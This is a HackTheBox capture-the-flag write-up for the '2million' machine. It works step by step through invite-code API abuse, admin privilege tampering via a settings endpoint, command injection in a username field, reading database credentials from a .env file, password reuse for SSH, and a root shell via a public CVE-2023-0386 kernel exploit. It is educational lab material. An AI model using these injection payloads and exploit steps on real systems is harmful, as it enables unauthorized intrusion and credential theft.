# HackTheBox: 2million Writeup

## Reconnaissance

We start by analyzing the web application, where we discover some obfuscated JavaScript functions dealing with an invite code mechanism. By deobfuscating the code, we find two interesting endpoints:

```javascript
function verifyInviteCode(code) {
    var formData = {"code": code};
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) { console.log(response); },
        error: function(response) { console.log(response); }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) { console.log(response); },
        error: function(response) { console.log(response); }
    });
}
```

We make a POST request to the endpoint responsible for explaining how to generate an invite code:

```sh
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

The response gives us an encrypted string:
```json
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

Decrypting the `ROT13` text reveals the following instruction:
> In order to generate the invite code, make a POST request to /api/v1/invite/generate

Following the instructions, we make a POST request to generate the code:

```sh
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
```

This provides a Base64-encoded string:
```json
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "MDhQRk0tTDYxVEEtUUFBOVYtSDEwVUQ=",
    "format": "encoded"
  }
}
```

Decoding it gives us a valid invite code:
```sh
echo "MDhQRk0tTDYxVEEtUUFBOVYtSDEwVUQ=" | base64 -d
08PFM-L61TA-QAA9V-H10UD
```

## Foothold and Initial Access

After registering and logging in, we navigate to `/home/access`, where there is a button to download a VPN connection file. We intercept the GET request:

```http
GET /api/v1/user/vpn/generate HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9
Cookie: PHPSESSID=860m9ksncif6qe701u480rco4c
Host: 2million.htb
Proxy-Connection: keep-alive
Referer: http://2million.htb/home/access
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
```

Using the obtained session cookie, we perform a GET request to the `/api` endpoint to enumerate available routes:

```sh
curl -sv http://2million.htb/api --cookie "PHPSESSID=860m9ksncif6qe701u480rco4c" | jq
```

We find that `/api/v1` contains more detailed information:

```sh
curl -sv http://2million.htb/api/v1 --cookie "PHPSESSID=860m9ksncif6qe701u480rco4c" | jq
```

This returns a list of API routes, including an interesting `admin` section:
```json
{
  "v1": {
    "user": { ... },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

First, we check our admin status:
```sh
curl -sv http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=860m9ksncif6qe701u480rco4c" | jq
```
The response is `{"message": false}`. We will try to elevate our privileges to admin by sending a PUT request to the `/api/v1/admin/settings/update` endpoint. After some trial and error dealing with missing parameters and content types, we structure the payload correctly:

```sh
curl -v -X PUT http://2million.htb/api/v1/admin/settings/update \
--cookie "PHPSESSID=vvj2ilu855lclbagann0kqds3l" \
-H "Content-Type: application/json" \
--data '{"email":"test@test.com", "is_admin":1}' | jq
```

This successfully changes our account to an administrator:
```json
{
  "id": 13,
  "username": "julicc",
  "is_admin": 1
}
```

Checking `/api/v1/admin/auth` again confirms our new role:
```json
{
  "message": true
}
```

As an administrator, we now have access to `/api/v1/admin/vpn/generate`. By providing a username in the POST request, the application generates a VPN configuration file. Since this might be executing a system command in the background, we test for Command Injection in the `username` field:

```sh
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
--cookie "PHPSESSID=vvj2ilu855lclbagann0kqds3l" \
--header "Content-Type: application/json" \
--data '{"username":"julicc;id;"}'
```

This returns command execution output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![[Pasted image 20260926171447.png]]

With Remote Code Execution (RCE) achieved, we look around the web directory and find a `.env` file containing database credentials:

```sh
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

We log into the MariaDB instance to extract user hashes:

```sh
mysql -u admin -p"SuperDuperPass123" htb_prod
MariaDB [htb_prod]> show tables;
MariaDB [htb_prod]> show columns from users;
MariaDB [htb_prod]> select username, password from users where is_admin = 1;
```

While the hashes are cracking, we notice the `admin` user on the system by inspecting `/etc/passwd`. Reusing the database password, we can SSH into the server as `admin`:

```sh
ssh admin@2million.htb
```

We successfully log in and retrieve the user flag:
`e95752e826fb81a2b867b6fd23cd3c4c`

## Privilege Escalation

Running `linpeas.sh` on the system reveals some interesting files. Checking the `/var/mail/admin` inbox gives us a huge hint:

```sh
admin@2million:~$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

![[Pasted image 20260926175358.png]]

The email directly points to an OverlayFS/FUSE vulnerability. This corresponds to `CVE-2023-0386`. We download the exploit locally and transfer it to the target machine:

```sh
git clone https://github.com/xkaneiki/CVE-2023-0386
scp -r CVE-2023-0386 admin@2million.htb:~/
```

On the target system, we compile and run the exploit:

```sh
admin@2million:~/CVE-2023-0386$ make all
admin@2million:~/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &
admin@2million:~/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
[+] readdir
[+] getattr_callback
...
[+] exploit success!
root@2million:~/CVE-2023-0386#
```

We successfully escalate our privileges to `root`!

Additionally, an alternative privilege escalation vector might involve checking the GLIBC version:
```sh
root@2million:/root# ldd --version
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
```

## Conclusion

In this machine, we started by interacting with an API to generate invite codes. By tampering with user settings via an insecure API endpoint, we escalated our privileges within the web application to an administrator. This allowed us to access an administrative VPN generation feature vulnerable to Command Injection. From there, we found database credentials which were reused for SSH access. Finally, reading internal emails hinted at a Linux kernel vulnerability in OverlayFS (CVE-2023-0386), which was leveraged to obtain root access.
